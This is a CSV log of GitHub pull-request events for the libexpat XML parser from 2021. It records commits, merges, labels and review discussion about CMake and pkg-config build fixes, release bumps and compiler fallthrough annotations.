482,MergePR,2021-05-13 15:49:44,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/4742584791"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/9fd364942bb310c4cb5f1e62e8d7655c96bef9ed""}"
482,Labeled,2021-05-13 15:49:58,hartwork,unfork_merge,enhancement,
482,DeleteBranch,2021-05-13 16:34:09,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/4742790279"", ""commit_url"": null}"
483,Labeled,2021-05-13 20:48:30,hartwork,unfork_merge,enhancement,
483,OpenPR,2021-05-13 20:48:30,hartwork,unfork_merge,,
483,Revise,2021-05-14 20:10:39,hartwork,unfork_merge,CMake: Streamline existing copyright header,"{""sha"": ""ad937138e9efbe8563efedf9d9c558b32d20778f"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-13T20:07:29Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-14T20:10:39Z""}}"
483,Revise,2021-05-14 20:10:39,hartwork,unfork_merge,expat.iss: Add MIT header,"{""sha"": ""b19cc837efea762c8d64e75ba9d02866685c2837"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-14T20:02:39Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-14T20:10:39Z""}}"
483,Revise,2021-05-14 20:10:39,hartwork,unfork_merge,doc/xmlwf.xml: Add GNU FDL 1.1 copyright header,"{""sha"": ""99aec2fc77b2da4fc6a196a7bfd5690b886a481e"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-13T20:28:09Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-14T20:10:39Z""}}"
483,Revise,2021-05-14 20:10:39,hartwork,unfork_merge,doc/xmlwf.xml: Drop two XML comments of little value,"{""sha"": ""1b782d2fef7a6eb30fac218228203621a253f050"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-13T20:36:39Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-14T20:10:39Z""}}"
483,Revise,2021-05-14 20:14:54,hartwork,unfork_merge,Increase precision in existing MIT headers based on Git history,"{""sha"": ""2c9230f611e7a69924cebb0272a5c073016b5dc2"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-13T20:03:25Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-14T20:14:54Z""}}"
483,Revise,2021-05-14 20:14:54,hartwork,unfork_merge,expat.iss: Use URLs with SSL,"{""sha"": ""4107aca9cb5ec18ae6aa1f34e38866ca08682b56"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-14T20:14:18Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-14T20:14:54Z""}}"
483,MergePR,2021-05-14 21:14:23,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/4748963493"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/0ee4a6a94e50fef516addcca066349b365614e5c""}"
483,DeleteBranch,2021-05-14 21:14:43,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/4748965292"", ""commit_url"": null}"
484,SubmitCommit,2021-05-14 18:46:09,hartwork,unfork_merge,lib: Fix accounting of CDATA sections inside of general entities,"{""sha"": ""60959f2b491876199879d97c8ed956eabb0c2e73"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-14T18:09:22Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-14T18:46:09Z""}}"
484,SubmitCommit,2021-05-14 18:46:09,hartwork,unfork_merge,tests: Cover accounting of CDATA sections inside of general entities,"{""sha"": ""77cfb8f4cd9679cef27ae9bc38e39ac51235af2d"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-14T18:26:26Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-14T18:46:09Z""}}"
484,Labeled,2021-05-14 19:26:42,hartwork,unfork_merge,bug,
484,Labeled,2021-05-14 19:26:42,hartwork,unfork_merge,security,
484,OpenPR,2021-05-14 19:26:42,hartwork,unfork_merge,,
484,MergePR,2021-05-14 19:55:50,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/4748684086"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/41b732a16381699e4c9ad831b6fef20c86cf9461""}"
484,DeleteBranch,2021-05-14 19:59:18,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/4748696576"", ""commit_url"": null}"
484,CrossReferenced,2021-05-23 18:35:42,hartwork,unfork_merge,[W.I.P.] Limit entity expansion to prevent DoS attacks,"{""reference"": {""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/220"", ""is_pull_request"": true}}"
486,Labeled,2021-05-20 22:11:13,hartwork,unfork_merge,bug,
486,OpenPR,2021-05-20 22:11:13,hartwork,unfork_merge,,
486,Revise,2021-05-20 22:14:36,hartwork,unfork_merge,cmake/autotools: Use AC_CHECK_SIZEOF to fix 32bit support,"{""sha"": ""09ec4ff9c14d1859f57efcb1303d666c8232d7a9"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-20T13:29:21Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-20T22:14:36Z""}}"
486,Revise,2021-05-20 22:14:36,hartwork,unfork_merge,cmake/autotools: Fix generated expat-noconfig.cmake for macOS and MinGW,"{""sha"": ""43142f0babc617123bccd2f516223c90ca9e6dbc"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-20T14:07:03Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-20T22:14:36Z""}}"
486,CrossReferenced,2021-05-20 22:19:44,hartwork,unfork_merge,[2.3.0] .so references in cmake/autotools/expat-noconfig.cmake.in incorrect for MinGW builds,"{""reference"": {""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/485"", ""is_pull_request"": false}}"
486,RenameTitle,2021-05-20 22:21:00,hartwork,unfork_merge,,"{""rename"": {""from"": ""[2.3.0] Fix CMake files installed by GNU Autotools build system (fixes #485)"", ""to"": ""Fix CMake files installed by GNU Autotools build system (fixes #485)""}, ""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/4776279284""}"
486,ReviewComment,2021-05-21 02:13:47,1480c1,unfork_merge,,"{""author_association"": ""NONE"", ""html_url"": ""https://github.com/libexpat/libexpat/pull/486#pullrequestreview-665017182""}"
486,Revise,2021-05-21 11:15:34,hartwork,unfork_merge,autotools-cmake.yml: Cover macOS and MinGW,"{""sha"": ""0b8dacdcce89386a9ebda8a192ecd0b78dee16df"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-20T21:32:29Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-21T11:15:34Z""}}"
486,Revise,2021-05-21 11:15:34,hartwork,unfork_merge,Changes: Document Autotools CMake file fixes,"{""sha"": ""192af39be0458273f0a8ac407e4a848d52f484d6"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-20T14:02:02Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-21T11:15:34Z""}}"
486,MergePR,2021-05-21 12:01:54,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/4778895949"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/caaf43470d360af7d76ee6a5f337c962831ce0f6""}"
486,DeleteBranch,2021-05-21 12:02:39,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/4778899094"", ""commit_url"": null}"
486,CrossReferenced,2021-05-23 00:09:42,hartwork,unfork_merge,[2.4.0] Need to get macro SIZEOF_VOID_P out of (installed) expat_config.h again for multilib support,"{""reference"": {""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/488"", ""is_pull_request"": false}}"
489,SubmitCommit,2021-05-23 00:27:13,hartwork,unfork_merge,"Actions: Avoid error ""would clobber existing tag"" when pushing new tags","{""sha"": ""6aa6fe90a38b874b58a1944d77970e4eaf118bbf"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-23T00:21:27Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-23T00:27:13Z""}}"
489,OpenPR,2021-05-23 00:28:52,hartwork,unfork_merge,,
489,MergePR,2021-05-23 01:12:47,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/4782844097"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/fa12e73d0526546de349661d2076a74fd9e9f93d""}"
489,Labeled,2021-05-23 01:12:57,hartwork,unfork_merge,enhancement,
489,DeleteBranch,2021-05-23 01:13:33,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/4782844528"", ""commit_url"": null}"
489,IssueCommentSupplement,2021-05-23 16:38:49,hartwork,unfork_merge,"PS: The fixed proved working, see https://github.com/libexpat/libexpat/runs/2650647896?check_suite_focus=true#step:5:38","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/846590990"", ""author_association"": ""MEMBER""}"
490,Labeled,2021-05-23 01:24:43,hartwork,unfork_merge,bug,
490,OpenPR,2021-05-23 01:24:43,hartwork,unfork_merge,,
490,Revise,2021-05-23 13:43:56,hartwork,unfork_merge,Keep macro SIZEOF_VOID_P out of expat_config.h(.in) for multilib support,"{""sha"": ""779d147681f4ff3bf399f5c4f2d77a8f0d266db4"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-23T01:30:41Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-23T13:43:56Z""}}"
490,MergePR,2021-05-23 14:52:20,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/4783413867"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/e215a91bce4e6acd29bb2daa55b7c9410b71ab42""}"
490,DeleteBranch,2021-05-23 14:52:50,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/4783414405"", ""commit_url"": null}"
492,SubmitCommit,2021-05-23 14:52:59,hartwork,unfork_merge,Bump version to 2.4.1,"{""sha"": ""8001550dc43afdad447ed3b1049f92fd44cb725b"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-23T13:35:33Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-23T14:52:59Z""}}"
492,SubmitCommit,2021-05-23 14:57:40,hartwork,unfork_merge,"Bump version info from 9:0:8 to 9:1:8

See https://verbump.de/ for what these numbers do.","{""sha"": ""13445938e77848774961fba6bc6e62f0d65d1bbf"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-23T14:57:10Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-23T14:57:40Z""}}"
492,SubmitCommit,2021-05-23 15:04:56,hartwork,unfork_merge,Set expected release date for 2.4.1,"{""sha"": ""92c3cad80fec0717f82813dcf2eedb82ad6df100"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-23T15:04:56Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-23T15:04:56Z""}}"
492,Labeled,2021-05-23 15:16:13,hartwork,unfork_merge,releasing,
492,OpenPR,2021-05-23 15:16:13,hartwork,unfork_merge,,
492,MergePR,2021-05-23 15:56:03,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/4783474179"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/a28238bdeebc087071777001245df1876a11f5ee""}"
492,DeleteBranch,2021-05-23 15:56:20,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/4783474438"", ""commit_url"": null}"
495,Labeled,2021-06-03 13:55:37,hartwork,unfork_merge,compilation,
495,OpenPR,2021-06-03 13:55:37,hartwork,unfork_merge,,
495,Labeled,2021-06-03 13:55:37,hartwork,unfork_merge,windows,
495,CrossReferenced,2021-06-03 13:57:33,hartwork,unfork_merge,[expat] Update to 2.4.1,"{""reference"": {""url"": ""https://api.github.com/repos/microsoft/vcpkg/issues/17856"", ""is_pull_request"": true}}"
495,RenameTitle,2021-06-03 14:05:08,hartwork,unfork_merge,,"{""rename"": {""from"": ""Fix pkg-config section \""Libs\"" for MinGW"", ""to"": ""CMake: Fix pkg-config section \""Libs\"" for MinGW""}, ""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/4837796762""}"
495,RenameTitle,2021-06-03 14:05:30,hartwork,unfork_merge,,"{""rename"": {""from"": ""CMake: Fix pkg-config section \""Libs\"" for MinGW"", ""to"": ""CMake: Fix pkg-config section \""Libs\"" for build type Debug with MinGW""}, ""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/4837798830""}"
495,CrossReferenced,2021-06-03 14:52:08,dg0yt,unfork_merge,Simplify lib name handling,"{""reference"": {""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/496"", ""is_pull_request"": true}}"
495,IssueComment,2021-06-03 14:54:17,dg0yt,unfork_merge,"Cf. #496.
Works for me (Mingw on Linux, `CMAKE_BUILD_TYPE=Debug`): pc file has `-lexpatd`, import lib is `libexpatd.dll.a`.","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/853932623"", ""author_association"": ""CONTRIBUTOR""}"
495,IssueComment,2021-06-04 21:40:21,hartwork,unfork_merge,"@dg0yt new approach pushed now, would be great to have your review. Thanks in advance! :pray: ","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/855014515"", ""author_association"": ""MEMBER""}"
495,Revise,2021-07-06 14:22:38,hartwork,unfork_merge,CMake: Improve summary output for multi-config builds,"{""sha"": ""f9eb8a1286e23ebbea852dfc4067562936a7b885"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-06-23T19:21:26Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-07-06T14:22:38Z""}}"
495,Revise,2021-07-06 14:22:38,hartwork,unfork_merge,CMake: Report on effective CMake generator,"{""sha"": ""40bf9fe84aa58c13b3c8de39495f9a1cabd4ab7c"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-06-23T19:12:32Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-07-06T14:22:38Z""}}"
495,Revise,2021-07-06 14:22:38,hartwork,unfork_merge,Autotools: Simplify expat.pc templating (now that we can),"{""sha"": ""19dd50990def0229b18dfdc2a9a2ab6f3491f9de"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-06-23T18:41:38Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-07-06T14:22:38Z""}}"
495,Revise,2021-07-06 14:22:38,hartwork,unfork_merge,"CMake: Fix pkg-config section ""Libs"" for multi-config CMake generators","{""sha"": ""1d4bb74c34c00a357478087998cc72684ae7aa16"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-06-23T17:56:29Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-07-06T14:22:38Z""}}"
495,Revise,2021-07-06 14:22:38,dg0yt,unfork_merge,Update URL in pc file,"{""sha"": ""663e529eed7720585177e93f87ba8f859c74a9ce"", ""author"": {""name"": ""Kai Pastor"", ""email"": ""dg0yt@darc.de"", ""date"": ""2021-06-03T14:58:23Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-07-06T14:22:38Z""}}"
495,Revise,2021-07-06 14:22:38,hartwork,unfork_merge,CMake: Apply -DEXPAT_MSVC_STATIC_CRT=ON to off-grid built types,"{""sha"": ""7cf97a9bda1b67cd2adba6d972b693aff0d8b875"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-06-23T18:23:09Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-07-06T14:22:38Z""}}"
495,Revise,2021-07-06 14:22:38,hartwork,unfork_merge,CMake: Avoid empty CMAKE_BUILD_TYPE,"{""sha"": ""b73c80a727feee73843221a13c816334d8ab2ba6"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-06-05T15:12:02Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-07-06T14:22:38Z""}}"
495,Revise,2021-07-06 14:22:38,hartwork,unfork_merge,CMake: Move _EXPAT_BUILD_TYPE_UPPER up for upcoming re-use,"{""sha"": ""a3bc9162e6b4b1bd79ac11b2d9f15066261c0540"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-06-03T13:27:16Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-07-06T14:22:38Z""}}"
495,Revise,2021-07-06 14:22:38,hartwork,unfork_merge,"CMake: Fix pkg-config section ""Libs"" for non-release MinGW builds","{""sha"": ""3486fd6e3d2bc269660cedd3befa1ae649d1dcf4"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-06-03T13:41:47Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-07-06T14:22:38Z""}}"
495,MergePR,2021-07-06 15:07:47,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/4983871358"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/ee695c78954edded24e5674722869daa69fd230a""}"
495,DeleteBranch,2021-07-06 15:08:25,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/4983875474"", ""commit_url"": null}"
495,CrossReferenced,2021-12-15 15:42:17,hartwork,unfork_merge,CMake: Ensure libexpat*.lib filenames with MSVC,"{""reference"": {""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/524"", ""is_pull_request"": true}}"
495,CrossReferenced,2022-03-24 12:14:29,dg0yt,unfork_merge,[expat]update to 2.4.8,"{""reference"": {""url"": ""https://api.github.com/repos/microsoft/vcpkg/issues/22575"", ""is_pull_request"": true}}"
496,SubmitCommit,2021-06-03 14:45:26,dg0yt,fork_close,Simplify lib name handling,"{""sha"": ""4b1b58900f1b758a1185c9eb18913db7b878a074"", ""author"": {""name"": ""Kai Pastor"", ""email"": ""dg0yt@darc.de"", ""date"": ""2021-06-03T14:12:57Z""}, ""committer"": {""name"": ""Kai Pastor"", ""email"": ""dg0yt@darc.de"", ""date"": ""2021-06-03T14:45:26Z""}}"
496,OpenPR,2021-06-03 14:52:07,dg0yt,fork_close,,
496,CrossReferenced,2021-06-03 14:54:17,dg0yt,fork_close,"CMake: Fix pkg-config section ""Libs"" for build type Debug with MinGW","{""reference"": {""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/495"", ""is_pull_request"": true}}"
496,Revise,2021-06-03 14:58:23,dg0yt,fork_close,Update URL in pc file,"{""sha"": ""35d97100f17ccbf95e0ccbfc1717d9d7c7a34228"", ""author"": {""name"": ""Kai Pastor"", ""email"": ""dg0yt@darc.de"", ""date"": ""2021-06-03T14:58:23Z""}, ""committer"": {""name"": ""Kai Pastor"", ""email"": ""dg0yt@darc.de"", ""date"": ""2021-06-03T14:58:23Z""}}"
496,IssueComment,2021-06-03 14:59:26,dg0yt,fork_close,... and use the current effective URL instead of the old http:// link.,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/853936580"", ""author_association"": ""CONTRIBUTOR""}"
496,ReviewComment,2021-06-04 14:54:39,hartwork,fork_close,"Hi @dg0yt , you have a point here: I have just confirmed locally that `CMAKE_DEBUG_POSTFIX` _does_ have an effect on the resulting filenames on Linux as well, so dropping that comment is a good thing. However, I believe we should we take your idea _even further_:

What if reduce the `_EXPAT_OUTPUT_NAME` logic down to…

```cmake
if(MSVC)
    # Avoid colliding with Expat.dll of Perl's XML::Parser::Expat
    # Everything but MSVC is already adding prefix ""lib"" automatically.
    set(_EXPAT_OUTPUT_NAME libexpat)
else()
    set(_EXPAT_OUTPUT_NAME expat)
endif()
```

…and then adjust the code setting `CMAKE_*_POSTFIX` to cover and be correct for non-WIN32 platforms?
If I'm not mistaken, we would need:
- ""w"" would appear on any platform
- ""d"" would appear on any WIN32, i.e. both MSVC and MINGW
- ""MT"" and ""MD"" would only appear with MSVC
- order would remain as is, eventual output would be identical; with the exception of the the new `_EXPAT_LIBRARY_NAME` all else would be a pure refactoring.

Going forward, I see that to be a new pull request based on `master`: I'd be find doing the work or the review, as you prefer. If you want to do the commit work, replacing this pull request right here targetting `master` and closing #495 would be an option. If I do the commits, we would close this one here and reuse of #495 is an option, and you would be in the review seat.

PS: :+1: for the TLS link fix, it caught my eyes as well.

What do you think?
","{""author_association"": ""MEMBER"", ""html_url"": ""https://github.com/libexpat/libexpat/pull/496#pullrequestreview-676377002""}"
496,IssueComment,2021-06-04 15:19:10,dg0yt,fork_close,"I cannot say much about WIN32 beyond MINGW. But I think there is more than just MSVC: clang, intel.... So `WIN32 AND NOT MINGW` is a fair pattern to separate the POSIX-like environment from the pure Windows environment.

I also don't know what your users expect. I assume they don't want changes if something isn't broken ;-) Dealing with the unicode variant name in another way might break things. Better leave this to expat 5.0.0?

That's why I don't propose to change more than fixing the pc files. 
Feel free to pick and edit this PR as you like. It was just more convenient for me to propose the changes in this way.
","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/854808694"", ""author_association"": ""CONTRIBUTOR""}"
496,IssueComment,2021-06-04 21:14:16,hartwork,fork_close,"Hi @dg0yt,

> I cannot say much about WIN32 beyond MINGW. But I think there is more than just MSVC: clang, intel.... So `WIN32 AND NOT MINGW` is a fair pattern to separate the POSIX-like environment from the pure Windows environment.

even if most of these other environments are not officially supported, that's a good point, understood.

> I also don't know what your users expect. I assume they don't want changes if something isn't broken ;-) Dealing with the unicode variant name in another way might break things. Better leave this to expat 5.0.0?

I understand your point. There is risk greater 0, yes, but we have CI and being careful on our side. Changes in the build system are way less critical than changes in the library, and not being able to touch anything because of fear would not be a healthy situation.

> That's why I don't propose to change more than fixing the pc files.
> Feel free to pick and edit this PR as you like. It was just more convenient for me to propose the changes in this way.

Okay, I will re-use #495 for a new take at this based on your and my ideas. I hope you'll join me over there for review, again. I'll close this one right here.","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/855000745"", ""author_association"": ""MEMBER""}"
496,ClosePR,2021-06-04 21:14:21,hartwork,fork_close,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/4845247329"", ""commit_url"": null}"
498,SubmitCommit,2021-06-05 19:17:25,hartwork,unfork_merge,Makefile.am: Include buildconf.sh and fuzz/*.c with release archives,"{""sha"": ""00839393f3b36a82fd1366882198f9e26c9bf401"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-06-05T19:17:25Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-06-05T19:17:25Z""}}"
498,OpenPR,2021-06-05 19:19:23,hartwork,unfork_merge,,
498,RenameTitle,2021-06-05 19:19:37,hartwork,unfork_merge,,"{""rename"": {""from"": ""Makefile.am: Include files buildconf.sh and fuzz/*.c with release archives"", ""to"": ""Include files buildconf.sh and fuzz/*.c with release archives""}, ""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/4847088934""}"
498,MergePR,2021-06-06 11:23:34,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/4848034001"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/6a0584a59a963554ffc1d8dea98bfec25b354d44""}"
498,Labeled,2021-06-06 11:23:42,hartwork,unfork_merge,bug,
498,DeleteBranch,2021-06-06 11:24:24,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/4848034853"", ""commit_url"": null}"
500,SubmitCommit,2021-06-26 23:08:28,pkasting,fork_close,"Fix -Wimplicit-fallthrough for Clang.

The existing /* fall through */ comments sufficed to annotate explicit
fallthrough for gcc, but not clang.  Convert to a macro that expands to
an annotation in supported compilers.

Further complicating this is that one of the #includes of xmltok_impl.c
makes the fallthrough annotations unreachable at compile time, so they
must be #defined away to avoid yet another warning (for an unreachable
fallthrough annotation) in that case.

Bug: chromium:995993","{""sha"": ""d59767d7832a335ea411b017bd8ea671300e69b9"", ""author"": {""name"": ""Peter Kasting"", ""email"": ""pkasting@chromium.org"", ""date"": ""2021-06-26T23:08:28Z""}, ""committer"": {""name"": ""Peter Kasting"", ""email"": ""pkasting@chromium.org"", ""date"": ""2021-06-26T23:08:28Z""}}"
500,OpenPR,2021-06-26 23:12:08,pkasting,fork_close,,
500,ReviewRejected,2021-06-27 17:25:43,hartwork,fork_close,"Hi @pkasting, good work, thanks for taking this upstream :+1: 
Please see my inline comments about details, below.

One more thing: Let's give CI a chance of regression testing this feature for us, e.g. with a patch like this:

```diff
diff --git a/expat/qa.sh b/expat/qa.sh
index 07947776..1d942eb1 100755
--- a/expat/qa.sh
+++ b/expat/qa.sh
@@ -102,6 +102,7 @@ populate_environment() {
                 export UBSAN_OPTIONS=""print_stacktrace=1:halt_on_error=1:abort_on_error=1""
                 ;;
         esac
+        BASE_COMPILE_FLAGS+="" -Wimplicit-fallthrough""
     fi
 
 
```

What do you think?","{""author_association"": ""MEMBER"", ""html_url"": ""https://github.com/libexpat/libexpat/pull/500#pullrequestreview-693436831""}"
500,IssueComment,2021-06-29 13:20:06,hartwork,fork_close,"@pkasting if you want to save some review ping-pong, I can also do video calls. Would be nice to get this done and  merged in the next few days to make a nice and round release 2.4.2.","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/870593727"", ""author_association"": ""MEMBER""}"
500,Revise,2021-06-29 14:37:36,pkasting,fork_close,Respond to review comments.,"{""sha"": ""1ab17890d36b09fcecd6e5f70d6a835ca607f9d9"", ""author"": {""name"": ""Peter Kasting"", ""email"": ""pkasting@chromium.org"", ""date"": ""2021-06-29T14:37:36Z""}, ""committer"": {""name"": ""Peter Kasting"", ""email"": ""pkasting@chromium.org"", ""date"": ""2021-06-29T14:37:36Z""}}"
500,IssueComment,2021-06-29 14:42:00,pkasting,fork_close,Thanks for such a gracious and inviting code review!  Sorry for the delay in responding.  I think I addressed all your comments; PTAL.,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/870662064"", ""author_association"": ""NONE""}"
500,IssueComment,2021-06-29 15:22:14,hartwork,fork_close,@pkasting I'm glad you liked the proposed changes — thanks for adjusting the PR. I like the new state but the the CI is asking for a few more changes in `xmlwf.c` due to the new `-Wimplicit-fallthrough`. It seems that `FALLTHROUGH`s are needed in more places?,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/870694185"", ""author_association"": ""MEMBER""}"
500,Revise,2021-06-29 15:43:49,pkasting,fork_close,Attempt to fix CI failures.,"{""sha"": ""6df1c8a09572350140d32a1ba72f5687d351237b"", ""author"": {""name"": ""Peter Kasting"", ""email"": ""pkasting@chromium.org"", ""date"": ""2021-06-29T15:43:49Z""}, ""committer"": {""name"": ""Peter Kasting"", ""email"": ""pkasting@chromium.org"", ""date"": ""2021-06-29T15:43:49Z""}}"
500,IssueComment,2021-06-29 15:45:24,pkasting,fork_close,"Yeah, it also was complaining about some of the FALLTHROUGH_IF_REACHABLEs under gcc -- seems gcc's reachability analysis disagrees with Clang's.  Argh.  Let's see if this version fixes it.","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/870712366"", ""author_association"": ""NONE""}"
